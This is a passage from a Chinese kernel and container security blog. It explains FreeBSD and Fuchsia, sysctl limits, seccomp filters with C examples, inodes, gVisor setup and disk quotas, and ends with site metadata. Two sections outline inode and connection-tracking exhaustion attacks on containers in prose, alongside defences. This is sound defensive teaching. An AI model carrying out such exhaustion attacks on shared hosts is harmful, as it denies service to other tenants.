Distribution（BSD）的源代码。FreeBSD成立于1993年，是BSD家族的一个成员，与NetBSD和OpenBSD等其他BSD操作系统并行发展。 FreeBSD的特点： 开源：FreeBSD的源代码可以免费获取和修改，遵循BSD许可证。这使得许多公司和开发者可以根据自己的需求定制操作系统。 稳定性：FreeBSD以其稳定性和可靠性而闻名，使其成为服务器和关键基础设施的理想选择。 性能：FreeBSD的性能优异，被广泛应用于高性能计算、网络服务和存储解决方案。 安全性：FreeBSD提供了多种安全功能，如强制访问控制、安全级别和防火墙集成。 可移植性：FreeBSD支持多种硬件平台，包括x86、x86-64、ARM、MIPS和PowerPC等。 FuchsiaFuchsia是由谷歌（Google）开发的一个开源操作系统。与FreeBSD不同，Fuchsia不是基于Unix的，而是基于名为Zircon的新内核构建的。Fuchsia的开发始于2016年，目标是创建一个高度模块化、可扩展且可用于各种设备的操作系统。 Fuchsia的特点： 开源：Fuchsia是一个开源项目，遵循BSD、MIT、Apache等许可证。这意味着开发者和公司可以免费访问和修改它的源代码。 Zircon内核：Fuchsia基于Zircon内核，这是一个微内核设计，使得操作系统更加轻量化和高度模块化。 跨平台：Fuchsia旨在成为一个统一的操作系统，适用于各种设备，包括智能手机、平板电脑、个人电脑以及物联网（IoT）设备。 模块化和可扩展性：Fuchsia的设计允许开发者轻松地添加和移除组件，使得操作系统能够根据需求进行定制化。 Flutter框架：Fuchsia使用谷歌的Flutter框架构建用户界面，Flutter支持跨平台应用开发，可以使Fuchsia应用在其他操作系统上运行。 总结，FreeBSD是一个基于Unix的稳定、高性能的开源操作系统，主要用于服务器和高性能计算。而Fuchsia是谷歌开发的一个全新的、基于Zircon内核的操作系统，旨在提供统一的、跨设备的体验。 sysctl接口Linux内核通过/proc/sys下的sysctl接口为用户空间程序提供了一种方式来查询和修改内核参数。sysctl可以通过文件系统访问，同时也可以通过命令行工具sysctl进行操作。这些参数涉及到许多内核子系统和组件，包括内存管理、网络设置、安全设置等。 在sysctl配置中，有很多参数涉及到抽象资源限制。这些限制通常用于约束系统资源的分配，以防止资源耗尽或者保证系统的稳定运行。以下是一些常见的资源限制相关的sysctl参数： vm.max_map_count：这个参数用于限制一个进程可以拥有的最大内存映射区域数量。这个限制有助于防止资源耗尽，尤其是在内存分配密集型的应用场景中。 kernel.pid_max：这个参数用于设置系统中分配的最大进程ID。通过限制进程ID的数量，可以防止恶意软件或编程错误导致的大量僵尸进程占用系统资源。 kernel.threads-max：这个参数用于限制系统中可以创建的最大线程数量。线程数量的限制可以防止过多的线程导致系统资源耗尽。 net.core.somaxconn：这个参数用于设置系统中最大的已完成连接队列长度。这个限制可以保障在高并发网络服务场景下，系统能够在资源有限的情况下处理连接请求。 fs.file-max：这个参数用于限制系统中可以打开的最大文件描述符数量。这个限制可以防止过多的文件描述符导致内核资源耗尽。 这些sysctl参数通常可以在系统启动时通过配置文件设置，也可以在运行时通过命令行工具sysctl进行动态调整。这为管理员和开发者提供了一种灵活的方式来优化系统性能和资源分配。 seccompseccomp（secure computing mode，安全计算模式）是一种Linux内核安全特性，允许在用户空间的进程将其可用的系统调用（syscalls）限制为一个最小的集合。这样做可以降低进程被攻击者利用的风险，因为攻击者可以使用的系统调用减少了。seccomp在容器、沙箱和其他高度安全的环境中非常有用，因为它可以限制潜在的攻击面。 seccomp的工作原理是允许进程定义一个系统调用白名单，只有在这个白名单上的系统调用才能被进程执行。当进程试图执行不在白名单上的系统调用时，内核会阻止进程，并根据seccomp的配置执行相应的操作。这些操作可能包括：终止进程、向进程发送信号或者返回一个错误码。 为了使用seccomp，进程需要使用prctl系统调用启用seccomp模式。接着，进程可以通过seccomp系统调用定义一个过滤器（通常是一个BPF（Berkeley Packet Filter）程序），用于检查系统调用的编号，并根据白名单执行相应的操作。 以下是一个简单的seccomp示例，演示了如何使用seccomp限制一个进程只能调用read、write、exit和rt_sigreturn系统调用： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;#include &lt;linux/audit.h&gt;#include &lt;sys/syscall.h&gt;#define ALLOW_SYSCALL(syscall_nr) \\ BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, syscall_nr, 0, 1), \\ BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)int main() &#123; // 定义seccomp过滤器 struct sock_filter filter[] = &#123; // 检查架构是否正确 BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, arch)), BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL), // 加载系统调用编号 BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, nr)), // 允许白名单上的系统调用 ALLOW_SYSCALL(__NR_read), ALLOW_SYSCALL(__NR_write), ALLOW_SYSCALL(__NR_exit), ALLOW_SYSCALL(__NR_rt_sigreturn), // 不允许的系统调用将导致进程被终止 BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL), &#125;; // 定义seccomp过滤器的元数据 struct sock_fprog prog = &#123; .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])), .filter = filter, &#125;; // 启用seccomp模式 if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) &lt; 0) &#123; perror(&quot;prctl&quot;); return 1; &#125; // 在此处执行您的程序逻辑 // 如果尝试执行不在白名单上的系统调用，进程将被终止 return 0;&#125; 请注意，这个示例使用的是seccomp的BPF过滤器，该过滤器提供了一种灵活的方式来控制系统调用。这种方法在容器和沙箱环境中非常有用，因为它可以针对特定应用程序的需求定制系统调用的限制。然而，编写BPF过滤器可能相对复杂，因此在实践中，许多开发者选择使用像libseccomp这样的库来简 化seccomp过滤器的创建和管理。 以下是使用libseccomp库的示例，实现与前面相同的功能： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;int main() &#123; // 初始化一个新的seccomp上下文 scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (!ctx) &#123; perror(&quot;seccomp_init&quot;); return 1; &#125; // 向过滤器中添加允许的系统调用 if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) &lt; 0 || seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) &lt; 0 || seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) &lt; 0 || seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0) &lt; 0) &#123; perror(&quot;seccomp_rule_add&quot;); seccomp_release(ctx); return 1; &#125; // 将过滤器加载到内核中 if (seccomp_load(ctx) &lt; 0) &#123; perror(&quot;seccomp_load&quot;); seccomp_release(ctx); return 1; &#125; // 释放资源 seccomp_release(ctx); // 在此处执行您的程序逻辑 // 如果尝试执行不在白名单上的系统调用，进程将被终止 return 0;&#125; 这个示例使用了libseccomp库提供的API，使得创建和管理seccomp过滤器更加简单。只需通过seccomp_init初始化一个新的上下文，使用seccomp_rule_add添加允许的系统调用，然后使用seccomp_load将过滤器加载到内核中。最后，使用seccomp_release释放资源。 总之，seccomp是一种在Linux内核中实现安全计算模式的机制，它允许进程限制其可用的系统调用集，从而降低潜在的攻击面。在容器、沙盒和其他高度安全的环境中，seccomp非常有用。使用BPF过滤器或第三方库（如libseccomp）可以帮助开发者更轻松地创建和管理seccomp过滤器。 inodeinode是什么在文件系统中，inode（索引节点）是一种数据结构，用于存储有关文件和目录的元数据（如权限、大小、创建时间等），但不包括文件名和实际文件数据。每个文件或目录在文件系统中都有一个唯一的inode，它们通过inode号进行识别。不同的文件系统类型（如ext4、XFS、Btrfs等）可能会有不同的inode实现，但其基本概念是相同的。 以下是inode可能包含的一些元数据信息： 文件类型（普通文件、目录、符号链接等） 文件大小 文件的权限（读、写、执行） 文件的所有者和所属组 创建、修改和访问时间戳 文件数据所在的磁盘块的位置 现在让我们通过一个简单的Python脚本示例来展示如何获取文件的inode信息： 1234567891011121314151617import osfile_path = &quot;example.txt&quot;# 获取文件的 inode 信息file_stat = os.stat(file_path)# 打印详细的 inode 信息print(f&quot;File path: &#123;file_path&#125;&quot;)print(f&quot;Inode number: &#123;file_stat.st_ino&#125;&quot;)print(f&quot;File size: &#123;file_stat.st_size&#125; bytes&quot;)print(f&quot;File owner: &#123;file_stat.st_uid&#125;&quot;)print(f&quot;File group: &#123;file_stat.st_gid&#125;&quot;)print(f&quot;File permissions: &#123;oct(file_stat.st_mode)[-4:]&#125;&quot;)print(f&quot;File creation time: &#123;file_stat.st_ctime&#125;&quot;)print(f&quot;File modification time: &#123;file_stat.st_mtime&#125;&quot;)print(f&quot;File access time: &#123;file_stat.st_atime&#125;&quot;) 在这个例子中，我们首先通过os.stat()函数获取了指定文件路径的inode信息。然后，我们可以从返回的os.stat_result对象中获取各种inode元数据，如文件大小、所有者、权限等。 需要注意的是，此示例仅适用于类Unix系统（如Linux和macOS）。在Windows系统上，文件元数据的管理方式与inode有所不同。可以使用Python的os模块的其他函数，如os.path.getsize()和os.path.getctime()等，来获取Windows系统上的文件元数据。 inode攻击inode攻击是一种资源耗尽攻击，其目标是耗尽文件系统中可用的inode。在这种攻击中，攻击者会在受害者容器中不断创建新文件或目录，从而分配大量的inode结构。由于Linux内核没有针对inode的cgroup隔离，这种攻击会影响整个分区，导致分区上的所有inode都被耗尽。 当inode耗尽时，任何试图创建新文件或目录的操作都会失败，无论这些操作来自受害者容器还是主机。在这种情况下，受害者容器可能会被驱逐，而主机也不能创建任何新文件。阿里云容器服务容易受到inode攻击的影响。 为了防御inode攻击，可以考虑以下方法： 限制容器的存储使用：为容器设置存储配额，以限制每个容器可以使用的存储空间。这可以防止攻击者耗尽整个文件系统的inode。 监控inode使用情况：定期检查文件系统的inode使用情况，以便在inode快速耗尽时发现潜在的攻击。 设置警报和自动响应：在inode使用达到临界值时设置警报，并实施自动响应措施，例如限制或隔离可疑容器。 运行时隔离：使用更高级别的运行时隔离技术，如gVisor或Kata Containers，以提供更强大的安全隔离。 需要注意的是，防御inode攻击的方法可能会对性能产生影响，因此在实施这些措施时需要权衡安全性和性能。 netns_ct-&gt;count攻击一种针对 Linux 内核中的连接跟踪功能（Netfilter）的攻击，该攻击涉及到利用 netns_ct-&gt;count 计数来消耗主机和容器的网络资源。这种攻击通常被称为连接消耗攻击（Connection Exhaustion Attack）或资源耗尽攻击（Resource Exhaustion Attack）。 攻击原理概述如下： 攻击者在容器内产生大量的 TCP 连接，这些连接会被跟踪。 尽管这些容器位于不同的网络命名空间（net namespace）中，但它们的所有连接都需要使用主机的 init_net.ct 计数。 当攻击者在短时间内产生大量连接时，会消耗掉主机的 init_net.ct 计数配额。 一旦配额耗尽，Netfilter 功能将受到影响，可能导致随机丢包等问题。 要防范这种攻击，可以采取以下措施： 限制容器的连接数：为每个容器设置连接数限制，以防止单个容器耗尽主机的连接资源。 限制连接速率：使用 Netfilter 的 iptables 工具限制容器的连接速率。例如，可以设置每秒最多允许的新连接数，从而防止攻击者在短时间内产生大量连接。 隔离网络命名空间：在某些情况下，可以为每个容器提供独立的网络命名空间，以降低资源争用的可能性。然而，这种方法可能会增加资源消耗和管理复杂性。 监控和报警：实施实时网络连接监控，以便在攻击发生时迅速检测并采取相应措施。 通过实施这些防范措施，可以降低容器和主机受到 netns_ct-&gt;count 攻击的风险。 gVisorgVisor 是一个开源的沙箱运行时，由谷歌开发，用于为容器提供隔离和安全性。gVisor 主要目标是为容器提供更高级别的安全性，同时保持接近原生容器的性能。它在容器与宿主机之间增加了一个用户空间内核，从而限制容器对宿主机内核的访问。这种方法降低了潜在安全漏洞对整个系统的影响。 gVisor 的核心组件是名为 “Sentry” 的用户空间内核，它拦截和处理来自容器的系统调用。Sentry 为每个容器提供了一个独立的内核实例，从而限制容器之间的相互影响。此外，gVisor 还包括一个名为 “Gofer” 的文件系统代理，用于将容器的文件系统操作转发到宿主机。 gVisor 与 Docker 和 Kubernetes 等容器运行时环境兼容，可以轻松集成到现有的容器部署中。为了在 Docker 中使用 gVisor，您需要安装 gVisor 并将其配置为 Docker 的运行时。以下是在 Docker 中使用 gVisor 的示例： 首先，安装 gVisor： 12345wget https://storage.googleapis.com/gvisor/releases/nightly/latest/runscwget https://storage.googleapis.com/gvisor/releases/nightly/latest/runsc.sha512sha512sum -c runsc.sha512chmod a+x runscsudo mv runsc /usr/local/bin 配置 Docker 使用 gVisor： 12345678910sudo mkdir -p /etc/dockerecho &#x27;&#123; &quot;runtimes&quot;: &#123; &quot;runsc&quot;: &#123; &quot;path&quot;: &quot;/usr/local/bin/runsc&quot;, &quot;runtimeArgs&quot;: [&quot;--platform=ptrace&quot;] &#125; &#125;&#125;&#x27; | sudo tee /etc/docker/daemon.jsonsudo systemctl restart docker 运行一个使用 gVisor 的 Docker 容器： 1docker run --runtime=runsc -it alpine sh 这将启动一个使用 gVisor 作为沙箱运行时的新容器。通过使用 gVisor，您可以提高容器的安全性，降低潜在安全漏洞对整个系统的影响。然而，需要注意的是，gVisor 可能会带来一定的性能损失，因此在实际应用中需要权衡安全性和性能。 Per-user quota restrictionsPer-user quota restrictions 是一种在文件系统层面设置的资源限制方法，用于控制每个用户所能使用的磁盘空间和文件数量。这种限制方法通常用于多用户共享同一系统资源的环境，如共享主机或服务器，以防止单个用户占用过多的磁盘空间或文件数量，从而导致其他用户无法正常使用系统资源。 Per-user quota restrictions 主要包括以下两种类型： 磁盘空间限制（Block Quotas）：该限制用于限制每个用户所能使用的磁盘空间。系统管理员可以为每个用户分配一定量的磁盘空间，当用户达到分配的磁盘空间上限时，将无法继续写入或创建新文件。 文件数量限制（Inode Quotas）：该限制用于限制每个用户所能创建的文件数量。系统管理员可以为每个用户分配一定数量的文件（或目录）创建权限，当用户达到分配的文件数量上限时，将无法继续创建新文件或目录。 在 Linux 系统中，可以通过以下步骤设置 per-user quota restrictions： 安装 quota 工具： 1sudo apt-get install quota quotatool 在 /etc/fstab 文件中启用用户配额。例如，为 /home 分区启用用户配额，可以将以下内容添加到 /etc/fstab 文件： 1/dev/sda1 /home ext4 defaults,usrquota,grpquota 0 0 重新挂载分区以应用更改： 1sudo mount -o remount /home 初始化配额文件： 1sudo quotacheck -cug /home 为特定用户设置配额限制。例如，为用户 exampleuser 设置 100MB 的磁盘空间限制和 1000 个文件数量限制： 1sudo setquota -u exampleuser 100000 110000 1000 1100 /home 使用 quota 命令查看用户配额情况： 1quota -u exampleuser 通过实施 per-user quota restrictions，系统管理员可以确保系统资源在用户之间公平地分配，防止单个用户过度使用资源。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"云安全","slug":"云安全","permalink":"http://example.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"}]},{"title":"Hello ,my blog","slug":"Hello-my-blog","date":"2022-06-23T06:44:47.000Z","updated":"2023-03-31T04:52:42.333Z","comments":true,"path":"2022/06/23/Hello-my-blog/","link":"","permalink":"http://example.com/2022/06/23/Hello-my-blog/","excerpt":"","text":"Zwei Dinge erfüllen das Gemuet mit immer neuer und zunehmender Bewunderung und Ehrfurcht, je öfter und anhaltender sich das Nachdenken damit beschäftigt:: der bestirnte Himmel über mir und das moralische Gesetz in mir.","categories":[{"name":"Dairy","slug":"Dairy","permalink":"http://example.com/categories/Dairy/"}],"tags":[{"name":"new","slug":"new","permalink":"http://example.com/tags/new/"}]}],"categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"},{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"Cgroup","slug":"Linux内核/Cgroup","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/Cgroup/"},{"name":"namespace","slug":"Linux内核/namespace","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/namespace/"},{"name":"系统调用","slug":"Linux内核/系统调用","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"权限","slug":"Linux内核/权限","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E6%9D%83%E9%99%90/"},{"name":"eBPF","slug":"Linux内核/eBPF","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/eBPF/"},{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"go","slug":"编程语言/go","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/"},{"name":"Podman","slug":"容器/Podman","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/Podman/"},{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"RUST","slug":"论文精读/RUST","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/RUST/"},{"name":"VFS","slug":"Linux内核/VFS","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/VFS/"},{"name":"文件系统","slug":"Linux内核/文件系统","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"C语言","slug":"编程语言/C语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80/"},{"name":"Rust for Linux","slug":"Linux内核/Rust-for-Linux","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/Rust-for-Linux/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"网络编程","slug":"编程语言/C/网络编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"},{"name":"项目实战","slug":"编程语言/C/项目实战","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"},{"name":"数据库","slug":"编程语言/C/数据库","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"QT","slug":"编程语言/C/QT","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/QT/"},{"name":"课程学习","slug":"课程学习","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"MIT6.S081 Operating System Engineering","slug":"课程学习/MIT6-S081-Operating-System-Engineering","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/MIT6-S081-Operating-System-Engineering/"},{"name":"学习路径","slug":"学习路径","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/"},{"name":"Ubuntu源码","slug":"Ubuntu源码","permalink":"http://example.com/categories/Ubuntu%E6%BA%90%E7%A0%81/"},{"name":"Dairy","slug":"Dairy","permalink":"http://example.com/categories/Dairy/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"eBPF","slug":"eBPF","permalink":"http://example.com/tags/eBPF/"},{"name":"glibc","slug":"glibc","permalink":"http://example.com/tags/glibc/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://example.com/tags/Ubuntu/"},{"name":"Podman","slug":"Podman","permalink":"http://example.com/tags/Podman/"},{"name":"C语言","slug":"C语言","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"},{"name":"文件系统","slug":"文件系统","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"VFS","slug":"VFS","permalink":"http://example.com/tags/VFS/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"线程","slug":"线程","permalink":"http://example.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"QT","slug":"QT","permalink":"http://example.com/tags/QT/"},{"name":"进程","slug":"进程","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Cgroup","slug":"Cgroup","permalink":"http://example.com/tags/Cgroup/"},{"name":"Makefile","slug":"Makefile","permalink":"http://example.com/tags/Makefile/"},{"name":"内核安全","slug":"内核安全","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"},{"name":"指针","slug":"指针","permalink":"http://example.com/tags/%E6%8C%87%E9%92%88/"},{"name":"云安全","slug":"云安全","permalink":"http://example.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"new","slug":"new","permalink":"http://example.com/tags/new/"}]}